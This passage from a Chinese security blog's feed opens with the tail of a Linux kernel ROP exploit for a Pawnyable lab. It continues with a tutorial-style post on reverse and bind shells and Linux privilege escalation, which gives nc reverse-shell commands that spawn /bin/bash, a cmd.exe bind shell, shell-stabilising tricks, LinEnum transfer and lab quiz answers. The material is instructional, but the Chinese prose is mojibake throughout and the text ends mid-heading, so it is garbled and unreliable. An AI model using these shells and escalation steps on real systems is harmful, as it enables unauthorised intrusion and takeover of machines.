class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>getRootShell<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rsp<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> ropchain<span class="token punctuation">,</span> <span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/c838977b74400db31efc647c8b0e2aa2_MD5.jpeg"></p><blockquote><p>ä½œè€…æä¾›äº†ä¸€ä¸ªå·¥å…· roprï¼š<a href="https://github.com/Ben-Lichtman/ropr">Ben-Lichtman&#x2F;roprï¼šä¸€ä¸ªè¶…å¿«â„¢çš„å¤šçº¿ç¨‹ ROP å°å·¥å…·æŸ¥æ‰¾å™¨ã€‚Ropper &#x2F; Ropgadgetç›¸å…³åº”ç”¨ â€” Ben-Lichtman&#x2F;ropr: A blazing fastâ„¢ multithreaded ROP Gadget finder. ropper &#x2F; ropgadget alternative (github.com)</a></p></blockquote><h1 id="äº”ã€é—²è°ˆ"><a href="#äº”ã€é—²è°ˆ" class="headerlink" title="äº”ã€é—²è°ˆ"></a>äº”ã€é—²è°ˆ</h1><p> ä¸€å¼€å§‹ï¼Œæˆ‘è§‰å¾—è‡ªå·±èƒ½å¤Ÿå¾ˆå¿«å®Œæˆè¿™ä¸ªåœºæ™¯ç›¸å…³çš„æ¼æ´åˆ©ç”¨ã€‚äº‹å®ä¸Šï¼Œä»ret2usråˆ°ç»•è¿‡kptiè¿™éƒ¨åˆ†ï¼Œæˆ‘ç¡®å®æ²¡æœ‰ç”¨å¤ªå¤šæ—¶é—´ï¼Œä½†æ˜¯åœ¨kaslrè¿™é‡Œå¡äº†å¾ˆä¹…ï¼ŒåŸå› å°±æ˜¯å‰é¢æåˆ°çš„é‚£ä¸ªgadgetè¢«ä¿®æ”¹çš„é—®é¢˜ã€‚</p><p>äº‹å®è¯æ˜ï¼Œåšéš¾è€Œæ­£ç¡®çš„äº‹çš„æ”¶è·æ˜¯å·¨å¤§çš„ã€‚è¿½è¸ªåˆ°åº•ï¼Œé—®é¢˜çš„èƒŒååˆ«æœ‰æ´å¤©ã€‚æ‰€è°“hackï¼Œå…¶å®æ­£æ˜¯ä¸æ–­åœ°å»æ¢ç´¢è¿™äº›æœªçŸ¥çš„ä¸œè¥¿ã€‚</p><hr><blockquote><p>é™„ä»¶ï¼š<a href="https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01.tar.gz">LK01.tar.gz</a><br>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.wohin.me/posts/pawnyable-0201/">Linux Kernel PWN | 040201 Pawnyableä¹‹æ ˆæº¢å‡º (wohin.me)</a><br><a href="https://pawnyable-cafe.translate.goog/linux-kernel/LK01/stack_overflow.html?_x_tr_sl=auto&_x_tr_tl=zh-CN&_x_tr_hl=zh-CN&_x_tr_pto=wapp">Holstein v1ï¼šå †æ ˆæº¢å‡ºåˆ©ç”¨ | å¯å…¸å½“ï¼ (pawnyable-cafe.translate.goog)</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux Kernel pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shellä¸Linuxå¸¸è§æƒé™æå‡æŠ€æœ¯</title>
      <link href="/2024/01/15/Shell%E4%B8%8ELinux%E5%B8%B8%E8%A7%81%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%8A%80%E6%9C%AF/"/>
      <url>/2024/01/15/Shell%E4%B8%8ELinux%E5%B8%B8%E8%A7%81%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<p><img src="/PenTest_FILE/f359dc9b359137fc0a67464fef1365fd_MD5.jpeg"></p><h1 id="ä¸€ã€shellæ˜¯ä»€ä¹ˆ"><a href="#ä¸€ã€shellæ˜¯ä»€ä¹ˆ" class="headerlink" title="ä¸€ã€shellæ˜¯ä»€ä¹ˆ"></a>ä¸€ã€shellæ˜¯ä»€ä¹ˆ</h1><h2 id="Shellçš„ç±»å‹"><a href="#Shellçš„ç±»å‹" class="headerlink" title="Shellçš„ç±»å‹"></a>Shellçš„ç±»å‹</h2><blockquote><p>åœ¨é«˜å±‚æ¬¡ä¸Šï¼Œå½“æ¶‰åŠåˆ°åˆ©ç”¨ç›®æ ‡æ—¶ï¼Œæˆ‘ä»¬å¯¹ä¸¤ç§ shell æ„Ÿå…´è¶£ï¼šåå‘ shell å’Œç»‘å®š shellã€‚</p></blockquote><ul><li>Reverse shells<br>åå‘ shell æ˜¯æŒ‡å¼ºåˆ¶ç›®æ ‡æ‰§è¡Œè¿æ¥å›è®¡ç®—æœºçš„ä»£ç ï¼Œåœ¨æ”»å‡»æœºä¸Šè®¾ç½®æ¥å—è¿æ¥çš„ä¾¦å¬å™¨ã€‚<br>åå‘ shell æ˜¯ç»•è¿‡é˜²ç«å¢™è§„åˆ™çš„å¥½æ–¹æ³•ï¼Œå› ä¸ºè¿™äº›è§„åˆ™å¯èƒ½ä¼šé˜»æ­¢æ‚¨è¿æ¥åˆ°ç›®æ ‡ä¸Šçš„ä»»æ„ç«¯å£ã€‚ä½†ç¼ºç‚¹æ˜¯ï¼Œå½“é€šè¿‡ Internet ä»è®¡ç®—æœºæ¥æ”¶ shell æ—¶ï¼Œæ‚¨éœ€è¦é…ç½®è‡ªå·±çš„ç½‘ç»œä»¥æ¥å— shellã€‚</li></ul><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªlinuxçš„åå‘shellä¾‹å­ï¼š</p><p>æ”»å‡»æœº<code>sudo nc -lvnp 443</code>ç›‘å¬ç«¯å£ï¼Œé¶æœº<code>nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash</code>è¿æ¥æˆ‘ä»¬çš„ipå’Œç›‘å¬ç«¯å£<br><img src="/PenTest_FILE/8986b480d2916588fe9ae5361abb94bc_MD5.jpeg"></p><ul><li>Bind shells<br>ç»‘å®š shell æ˜¯æŒ‡ä½¿ç”¨åœ¨ç›®æ ‡ä¸Šæ‰§è¡Œçš„ä»£ç æ¥å¯åŠ¨ç›´æ¥åœ¨ç›®æ ‡ä¸Šé™„åŠ åˆ° shell çš„ä¾¦å¬å™¨ã€‚<br>è¿™å°†å‘äº’è”ç½‘å¼€æ”¾ï¼Œè¿™æ„å‘³ç€æ‚¨å¯ä»¥è¿æ¥åˆ°ä»£ç å·²æ‰“å¼€çš„ç«¯å£ï¼Œå¹¶ä»¥è¿™ç§æ–¹å¼è·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œã€‚è¿™æ ·åšçš„ä¼˜ç‚¹æ˜¯ä¸éœ€è¦åœ¨æ‚¨è‡ªå·±çš„ç½‘ç»œä¸Šè¿›è¡Œä»»ä½•é…ç½®ï¼Œä½†ç¼ºç‚¹æ˜¯å¯ä»¥é€šè¿‡ä¿æŠ¤ç›®æ ‡çš„é˜²ç«å¢™æ¥é˜»æ­¢ã€‚</li></ul><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªwindowsçš„ç»‘å®šshellä¾‹å­ï¼š<br>é¶æœº<code>nc -lvnp &lt;port&gt; -e &quot;cmd.exe&quot;</code>åœ¨æœ¬åœ°å¼€æ”¾ç«¯å£ï¼Œæ”»å‡»æœº<code>nc MACHINE_IP &lt;port&gt;</code>å»è¿æ¥é¶æœºçš„è¯¥ç«¯å£<br><img src="/PenTest_FILE/d0ca8083ce4908d80fad645da9518acb_MD5.jpeg"></p><hr><p>è¿˜æœ‰ä¸€ä¸ªæ¦‚å¿µæ˜¯äº¤äº’æ€§ï¼ŒShell å¯ä»¥æ˜¯äº¤äº’å¼çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯éäº¤äº’å¼çš„ã€‚</p><h2 id="ä¸€-Netcat-shell"><a href="#ä¸€-Netcat-shell" class="headerlink" title="(ä¸€) Netcat shell"></a>(ä¸€) Netcat shell</h2><h3 id="Netcat-shell"><a href="#Netcat-shell" class="headerlink" title="Netcat shell"></a>Netcat shell</h3><ul><li>Reverse shell<br>ä½¿ç”¨ Linux å¯åŠ¨ netcat ä¾¦å¬å™¨çš„è¯­æ³•å¦‚ä¸‹ï¼š<br><code>nc -lvnp &lt;port-number&gt;</code></li></ul><blockquote><p>-lï¼šç”¨äºå‘Šè¯‰ netcat è¿™å°†æ˜¯ä¸€ä¸ªä¾¦å¬å™¨<br>-vï¼šè¯¦ç»†ä¿¡æ¯<br>-nï¼šå‘Šè¯‰ netcat ä¸è¦è§£æä¸»æœºåæˆ–ä½¿ç”¨ DNS<br>-pï¼šè¡¨ç¤ºå°†éµå¾ªç«¯å£è§„èŒƒ</p></blockquote><p>ä¸Šä¸€ä¸ªä»»åŠ¡ä¸­çš„ç¤ºä¾‹ä½¿ç”¨äº†ç«¯å£ 443ã€‚å®é™…ä¸Šï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»»ä½•æ‚¨å–œæ¬¢çš„ç«¯å£ï¼Œåªè¦è¿˜æ²¡æœ‰æœåŠ¡ä½¿ç”¨å®ƒã€‚è¯·æ³¨æ„ï¼Œå¦‚æœé€‰æ‹©ä½¿ç”¨ä½äº 1024 çš„ç«¯å£ï¼Œåˆ™éœ€è¦åœ¨å¯åŠ¨ä¾¦å¬å™¨æ—¶ä½¿ç”¨Â <code>sudo</code>Â ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä½¿ç”¨å·²çŸ¥çš„ç«¯å£å·ï¼ˆ80ã€443 æˆ– 53 æ˜¯ä¸é”™çš„é€‰æ‹©ï¼‰é€šå¸¸æ˜¯ä¸€ä¸ªå¥½ä¸»æ„ï¼Œå› ä¸ºè¿™æ›´æœ‰å¯èƒ½ç»•è¿‡ç›®æ ‡ä¸Šçš„å‡ºç«™é˜²ç«å¢™è§„åˆ™ã€‚</p><ul><li>Bind shell<br>å¦‚æœæˆ‘ä»¬å¸Œæœ›åœ¨ç›®æ ‡ä¸Šè·å¾—ç»‘å®š shellï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å‡è®¾åœ¨ç›®æ ‡çš„é€‰å®šç«¯å£ä¸Šå·²ç»æœ‰ä¸€ä¸ªä¾¦å¬å™¨åœ¨ç­‰ç€æˆ‘ä»¬ï¼šæˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯è¿æ¥åˆ°å®ƒã€‚å…¶è¯­æ³•ç›¸å¯¹ç®€å•ï¼š<br><code>nc &lt;target-ip&gt; &lt;chosen-port&gt;</code></li></ul><h3 id="ç¨³å®šshell"><a href="#ç¨³å®šshell" class="headerlink" title="ç¨³å®šshell"></a>ç¨³å®šshell</h3><blockquote><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™äº› shell éå¸¸ä¸ç¨³å®šã€‚æŒ‰ Ctrl + C ä¼šæ€æ­»æ•´ä¸ªäº‹æƒ…ã€‚å®ƒä»¬æ˜¯éäº¤äº’å¼çš„ï¼Œå¹¶ä¸”ç»å¸¸æœ‰å¥‡æ€ªçš„æ ¼å¼é”™è¯¯ã€‚è¿™æ˜¯å› ä¸º netcat çš„â€œshellâ€å®é™…ä¸Šæ˜¯åœ¨ç»ˆç«¯å†…è¿è¡Œçš„è¿›ç¨‹ï¼Œè€Œä¸æ˜¯çœŸæ­£çš„ç»ˆç«¯ã€‚å¹¸è¿çš„æ˜¯ï¼Œæœ‰å¾ˆå¤šæ–¹æ³•å¯ä»¥ç¨³å®š Linux ç³»ç»Ÿä¸Šçš„ netcat shellã€‚</p></blockquote><h4 id="â… -python"><a href="#â… -python" class="headerlink" title="â… . python"></a>â… . python</h4><p>è¿™ç§æŠ€æœ¯ä»…ä»…é€‚ç”¨äºlinuxæœºå™¨ï¼Œå› ä¸ºå®ƒä»¬æ€»æ˜¯é»˜è®¤å®‰è£…äº†python</p><ol><li><p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br>å®ƒä½¿ç”¨ Python ç”Ÿæˆå¤–è§‚æ›´å¥½çš„ bash shellã€‚è¯·æ³¨æ„ï¼ŒæŸäº›ç›®æ ‡å¯èƒ½éœ€è¦æŒ‡å®šçš„ Python ç‰ˆæœ¬ã€‚å¦‚æœæ˜¯è¿™ç§æƒ…å†µï¼Œè¯·æ ¹æ®éœ€è¦æ›¿æ¢ä¸ºÂ <code>python</code>Â <code>python2</code>Â æˆ–Â <code>python3</code>Â ã€‚</p></li><li><p><code>export TERM=xterm</code><br>è¿™å°†ä½¿æˆ‘ä»¬èƒ½å¤Ÿè®¿é—®æœ¯è¯­å‘½ä»¤ï¼Œä¾‹å¦‚Â <code>clear</code>Â .</p></li><li><p><code>stty raw -echo; fg</code><br>æœ€åï¼ˆä¹Ÿæ˜¯æœ€é‡è¦çš„ï¼‰æˆ‘ä»¬å°†ä½¿ç”¨ Ctrl + Z å¯¹ shell è¿›è¡Œåå°å¤„ç†ã€‚å›åˆ°æˆ‘ä»¬è‡ªå·±çš„ç»ˆç«¯ä¸­ï¼Œæˆ‘ä»¬æ‰§è¡Œ<code>stty raw -echo; fg</code>Â ã€‚è¿™åšäº†ä¸¤ä»¶äº‹ï¼šå®ƒå…³é—­äº†æˆ‘ä»¬è‡ªå·±çš„ç»ˆç«¯å›æ˜¾ï¼ˆå®ƒä½¿æˆ‘ä»¬èƒ½å¤Ÿè®¿é—® Tab è‡ªåŠ¨å®Œæˆã€ç®­å¤´é”®å’Œ Ctrl + C æ¥ç»ˆæ­¢è¿›ç¨‹ï¼‰ï¼Œå¹¶å°†æ‹¿åˆ°çš„shellæ”¾åœ¨æˆ‘ä»¬è‡ªå·±çš„ç»ˆç«¯ã€‚</p></li></ol><blockquote><p>è¯·æ³¨æ„ï¼Œå¦‚æœ shell æ­»äº¡ï¼Œæ‚¨è‡ªå·±çš„ç»ˆç«¯ä¸­çš„ä»»ä½•è¾“å…¥éƒ½å°†ä¸å¯è§ï¼ˆç”±äºç¦ç”¨äº†ç»ˆç«¯å›æ˜¾ï¼‰ã€‚è§£å†³æ–¹æ³•æ˜¯é”®å…¥Â <code>reset</code>Â å¹¶æŒ‰ Enterã€‚</p></blockquote><h4 id="â…¡-rlwarp"><a href="#â…¡-rlwarp" class="headerlink" title="â…¡. rlwarp"></a>â…¡. rlwarp</h4><blockquote><p>RLWrap æ˜¯ä¸€ä¸ªç¨‹åºï¼Œç®€å•æ¥è¯´ï¼Œå®ƒä½¿æˆ‘ä»¬èƒ½å¤Ÿåœ¨æ”¶åˆ° shell åç«‹å³è®¿é—®å†å²è®°å½•ã€Tab è‡ªåŠ¨å®Œæˆå’Œç®­å¤´é”®ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒKali ä¸Šæœªå®‰è£… rlwrapï¼Œå› æ­¤é¦–å…ˆä½¿ç”¨Â <code>sudo apt install rlwrap</code></p></blockquote><p><code>rlwrap nc -lvnp &lt;port&gt;</code></p><blockquote><p>åœ¨ netcat ç›‘å¬å™¨å‰é¢åŠ ä¸Š â€œrlwrapâ€ ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªåŠŸèƒ½æ›´å…¨é¢çš„ shellã€‚è¿™ç§æŠ€æœ¯åœ¨å¤„ç† Windows shell æ—¶ç‰¹åˆ«æœ‰ç”¨ã€‚<br>è€Œåœ¨å¤„ç† Linux ç›®æ ‡æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä¸ä¸Šä¸€ç§æŠ€æœ¯çš„ç¬¬ä¸‰æ­¥ç›¸åŒçš„æŠ€å·§æ¥å®Œå…¨ç¨³å®šï¼šä½¿ç”¨ Ctrl + Z ä½¿ shell èƒŒæ™¯ï¼Œç„¶åç”¨äºÂ <code>stty raw -echo; fg</code>Â ç¨³å®šå¹¶é‡æ–°è¿›å…¥ shellã€‚</p></blockquote><h4 id="â…¢-socat"><a href="#â…¢-socat" class="headerlink" title="â…¢. socat"></a>â…¢. socat</h4><blockquote><p>ç¨³å®š shell çš„ç¬¬ä¸‰ç§ç®€å•æ–¹æ³•æ˜¯ä½¿ç”¨åˆå§‹ netcat shell ä½œä¸ºè¿›å…¥åŠŸèƒ½æ›´å…¨é¢çš„ socat shell çš„å«è„šçŸ³ã€‚è¯·è®°ä½ï¼Œæ­¤æŠ€æœ¯ä»…é™äº Linux ç›®æ ‡ï¼Œ<strong>å› ä¸º Windows ä¸Šçš„ Socat shell ä¸ä¼šæ¯” netcat shell æ›´ç¨³å®š</strong></p></blockquote><h2 id="äºŒ-Socket-shell"><a href="#äºŒ-Socket-shell" class="headerlink" title="(äºŒ) Socket shell"></a>(äºŒ) Socket shell</h2><h3 id="Socket-shell"><a href="#Socket-shell" class="headerlink" title="Socket shell"></a>Socket shell</h3><h3 id="åŠ å¯†shell"><a href="#åŠ å¯†shell" class="headerlink" title="åŠ å¯†shell"></a>åŠ å¯†shell</h3><h2 id="ä¸‰-Msfvenom"><a href="#ä¸‰-Msfvenom" class="headerlink" title="(ä¸‰) Msfvenom"></a>(ä¸‰) Msfvenom</h2><blockquote><p>Msfvenomï¼Œæ˜¯ä¸æ‰€æœ‰payloadç›¸å…³çš„ä¸€ç«™å¼å•†åº—ã€‚ä½œä¸º Metasploit æ¡†æ¶çš„ä¸€éƒ¨åˆ†ï¼Œmsfvenom ä¸»è¦ç”¨äºç”Ÿæˆåå‘å’Œç»‘å®š shell çš„ä»£ç ã€‚å®ƒå¹¿æ³›ç”¨äºè¾ƒä½çº§åˆ«çš„æ¼æ´åˆ©ç”¨å¼€å‘ä¸­ï¼Œä»¥åœ¨å¼€å‘ç±»ä¼¼ç¼“å†²åŒºæº¢å‡ºæ¼æ´æ—¶ç”Ÿæˆåå…­è¿›åˆ¶ shellcodeï¼›ä½†æ˜¯ï¼Œå®ƒä¹Ÿå¯ç”¨äºç”Ÿæˆå„ç§æ ¼å¼ï¼ˆä¾‹å¦‚Â <code>.exe</code>Â ï¼ŒÂ <code>.aspx</code>ï¼ŒÂ <code>.war</code>ï¼ŒÂ <code>.py</code>Â ï¼‰çš„æœ‰æ•ˆè½½è·</p></blockquote><h2 id="å››-Webshells"><a href="#å››-Webshells" class="headerlink" title="(å››)Webshells"></a>(å››)Webshells</h2><h2 id="Linuxç»ƒä¹ ç®±"><a href="#Linuxç»ƒä¹ ç®±" class="headerlink" title="Linuxç»ƒä¹ ç®±"></a>Linuxç»ƒä¹ ç®±</h2><h2 id="Windowsç»ƒä¹ ç®±"><a href="#Windowsç»ƒä¹ ç®±" class="headerlink" title="Windowsç»ƒä¹ ç®±"></a>Windowsç»ƒä¹ ç®±</h2><h1 id="äºŒã€å¸¸è§Linuxæƒé™æå‡æŠ€æœ¯"><a href="#äºŒã€å¸¸è§Linuxæƒé™æå‡æŠ€æœ¯" class="headerlink" title="äºŒã€å¸¸è§Linuxæƒé™æå‡æŠ€æœ¯"></a>äºŒã€å¸¸è§Linuxæƒé™æå‡æŠ€æœ¯</h1><p><img src="/PenTest_FILE/0a70592ff63c044809ad9164425e3aed_MD5.jpeg"></p><ul><li>æ°´å¹³æƒé™æå‡ï¼šè¿™æ˜¯é€šè¿‡æ¥ç®¡ä¸æ‚¨å¤„äºç›¸åŒæƒé™çº§åˆ«çš„å…¶ä»–ç”¨æˆ·æ¥æ‰©å¤§å¯¹å—æ„ŸæŸ“ç³»ç»Ÿçš„å½±å“èŒƒå›´çš„åœ°æ–¹ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªæ™®é€šç”¨æˆ·åŠ«æŒå¦ä¸€ä¸ªæ™®é€šç”¨æˆ·ï¼ˆè€Œä¸æ˜¯æå‡ä¸ºè¶…çº§ç”¨æˆ·ï¼‰ã€‚è¿™å…è®¸æ‚¨ç»§æ‰¿è¯¥ç”¨æˆ·æ‹¥æœ‰çš„ä»»ä½•æ–‡ä»¶å’Œè®¿é—®æƒé™ã€‚ä¾‹å¦‚ï¼Œè¿™å¯ç”¨äºè®¿é—®å¦ä¸€ä¸ªæ™®é€šç‰¹æƒç”¨æˆ·ï¼Œè¯¥ç”¨æˆ·æ°å¥½å°† SUID æ–‡ä»¶é™„åŠ åˆ°å…¶ä¸»ç›®å½•ï¼ˆç¨åä¼šè¯¦ç»†ä»‹ç»ï¼‰ï¼Œç„¶åå¯ä»¥ä½¿ç”¨è¯¥æ–‡ä»¶æ¥è·å–è¶…çº§ç”¨æˆ·è®¿é—®æƒé™ã€‚</li><li>å‚ç›´æƒé™æå‡ï¼šè¿™æ˜¯æ‚¨å°è¯•ä½¿ç”¨å·²æ³„éœ²çš„ç°æœ‰å¸æˆ·è·å¾—æ›´é«˜æƒé™æˆ–è®¿é—®æƒé™çš„åœ°æ–¹ã€‚å¯¹äºæœ¬åœ°æƒé™å‡çº§æ”»å‡»ï¼Œè¿™å¯èƒ½æ„å‘³ç€åŠ«æŒå…·æœ‰ç®¡ç†å‘˜æƒé™æˆ– root æƒé™çš„å¸æˆ·ã€‚</li></ul><h2 id="ä¸€-æšä¸¾"><a href="#ä¸€-æšä¸¾" class="headerlink" title="(ä¸€) æšä¸¾"></a>(ä¸€) æšä¸¾</h2><blockquote><p>æˆ‘ä»¬éœ€è¦ç”¨åˆ°ä¸€ä¸ªbashè„šæœ¬ï¼š<code>LinEnum</code>ï¼Œ<a href="%5Bhttps://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh%5D(https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)">åœ°å€</a>ã€‚LinEnum æ˜¯ä¸€ä¸ªç®€å•çš„ bash è„šæœ¬ï¼Œå®ƒæ‰§è¡Œä¸æƒé™æå‡ç›¸å…³çš„å¸¸è§å‘½ä»¤ã€‚</p></blockquote><h3 id="å¦‚ä½•åœ¨ç›®æ ‡è®¡ç®—æœºè·å¾—LinEnum"><a href="#å¦‚ä½•åœ¨ç›®æ ‡è®¡ç®—æœºè·å¾—LinEnum" class="headerlink" title="å¦‚ä½•åœ¨ç›®æ ‡è®¡ç®—æœºè·å¾—LinEnum"></a>å¦‚ä½•åœ¨ç›®æ ‡è®¡ç®—æœºè·å¾—LinEnum</h3><ol><li><p>ç¬¬ä¸€ç§æ–¹æ³•ï¼šæ˜¯åœ¨æœ¬æœºè½¬åˆ°å­˜å‚¨ LinEnum æœ¬åœ°å‰¯æœ¬çš„ç›®å½•ï¼Œå¹¶ä½¿ç”¨<code>python3 -m http.server 8000</code> [1] å¯åŠ¨ Python Web æœåŠ¡å™¨ã€‚ç„¶åï¼Œåœ¨ç›®æ ‡æœºå™¨ä¸Šä½¿ç”¨<code>wget</code>è¿æ¥æœ¬åœ° IP:8000ï¼Œæ‚¨å¯ä»¥ä»æœ¬åœ°æœºå™¨ [2] è·å–æ–‡ä»¶ã€‚ç„¶åä½¿ç”¨å‘½ä»¤<code>chmod +x FILENAME.sh</code>ä½¿æ–‡ä»¶å¯æ‰§è¡Œã€‚</p></li><li><p>ç¬¬äºŒç§æ–¹æ³•ï¼šå¦‚æœæ‚¨æ— æ³•ä¼ è¾“æ–‡ä»¶ï¼Œæ‚¨è¿˜å¯ä»¥ä»æœ¬åœ°è®¡ç®—æœº [1] ç›´æ¥å¤åˆ¶åŸå§‹ LinEnum ä»£ç ï¼Œå¹¶ä½¿ç”¨ Vi æˆ– Nano [2] å°†å…¶ç²˜è´´åˆ°ç›®æ ‡ä¸Šçš„æ–°æ–‡ä»¶ä¸­ã€‚</p></li></ol><h3 id="LinEnumçš„ä½¿ç”¨"><a href="#LinEnumçš„ä½¿ç”¨" class="headerlink" title="LinEnumçš„ä½¿ç”¨"></a>LinEnumçš„ä½¿ç”¨</h3><p>æˆ‘ä»¬å…³æ³¨è¾“å‡ºçš„è¿™å‡ é¡¹å†…å®¹ï¼š</p><ul><li><em>Kernel</em>ï¼šæ­¤å¤„æ˜¾ç¤ºå†…æ ¸ä¿¡æ¯ã€‚è¿™å°æœºå™¨å¾ˆå¯èƒ½å­˜åœ¨å¯ç”¨çš„å†…æ ¸æ¼æ´ã€‚</li><li><em>Can we read&#x2F;write sensitive files</em>ï¼šè¿™äº›æ˜¯ä»»ä½•ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·éƒ½å¯ä»¥è¯»å–å’Œå†™å…¥çš„æ–‡ä»¶ã€‚é€šè¿‡æŸ¥çœ‹è¿™äº›æ•æ„Ÿæ–‡ä»¶çš„æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å“ªé‡Œå­˜åœ¨é…ç½®é”™è¯¯ï¼Œå…è®¸é€šå¸¸ä¸åº”è¯¥å†™å…¥æ•æ„Ÿæ–‡ä»¶çš„ç”¨æˆ·ã€‚</li><li><em>SUID Files</em>ï¼šæ­¤å¤„æ˜¾ç¤ºäº† SUID æ–‡ä»¶çš„è¾“å‡ºã€‚æœ‰ä¸€äº›æœ‰è¶£çš„é¡¹ç›®ï¼Œæˆ‘ä»¬è‚¯å®šä¼šå°†å…¶ä½œä¸ºæå‡ç‰¹æƒçš„ä¸€ç§æ–¹å¼ã€‚SUIDï¼ˆåœ¨æ‰§è¡Œæ—¶è®¾ç½®æ‰€æœ‰è€…ç”¨æˆ· IDï¼‰æ˜¯æˆäºˆæ–‡ä»¶çš„ä¸€ç§ç‰¹æ®Šç±»å‹çš„æ–‡ä»¶æƒé™ã€‚å®ƒå…è®¸æ–‡ä»¶ä»¥æ‰€æœ‰è€…çš„æƒé™è¿è¡Œã€‚å¦‚æœè¿™æ˜¯ rootï¼Œåˆ™å®ƒä»¥ root æƒé™è¿è¡Œã€‚å®ƒå¯ä»¥è®©æˆ‘ä»¬æå‡æƒé™ã€‚</li><li><em>CrontabÂ Contents</em>ï¼šcrontabæ˜¯ä¸€ä¸ªç³»ç»Ÿä¸­å®šæœŸæ‰§è¡Œä»»åŠ¡çš„å·¥å…·</li></ul><h3 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><p>å…ˆç”¨sshè¿æ¥ä¸»æœºï¼Œä»¥user3çš„èº«ä»½ç™»å½•</p><p>ä½¿ç”¨python webæœåŠ¡å™¨ï¼Œä¼ è¾“LinEnum.sh<br><img src="/PenTest_FILE/d48205e48d07ead847c2b110654b759b_MD5.jpeg"></p><ol><li>ç›®æ ‡çš„ä¸»æœºåæ˜¯ä»€ä¹ˆï¼Ÿç­”ï¼špolobox<br>ç›´æ¥hostnameå‘½ä»¤å³å¯</li><li>æŸ¥çœ‹ &#x2F;etc&#x2F;passwd çš„è¾“å‡ºï¼Œç³»ç»Ÿä¸Šæœ‰å¤šå°‘ä¸ªâ€œuser[x]â€ï¼Ÿç­”ï¼š8<br><img src="/PenTest_FILE/e8048726010b63d973dd291a0190e26c_MD5.jpeg"></li><li>ç³»ç»Ÿä¸Šæœ‰å¤šå°‘ä¸ªå¯ç”¨çš„shellï¼Ÿç­”ï¼š4<br>æŸ¥çœ‹&#x2F;etc&#x2F;shells<br><img src="/PenTest_FILE/654a118fe4a67e3e7c36a4868e41694f_MD5.jpeg"></li><li>cron è®¾ç½®ä¸ºæ¯ 5 åˆ†é’Ÿè¿è¡Œä¸€æ¬¡çš„ bash è„šæœ¬çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿç­”ï¼šautoscript.sh<br>æŸ¥çœ‹&#x2F;etc&#x2F;crontab<br><img src="/PenTest_FILE/ae55b638765cf9226940c7aaf1d1156f_MD5.jpeg"></li><li>å“ªä¸ªå…³é”®æ–‡ä»¶çš„æƒé™å·²æ›´æ”¹ä»¥å…è®¸æŸäº›ç”¨æˆ·å†™å…¥å®ƒï¼Ÿç­”ï¼š&#x2F;etc&#x2F;passwd<br><img src="/PenTest_FILE/f8cd54fbb40f976465fffea80fd1616e_MD5.jpeg"></li></ol><p>s## (äºŒ) 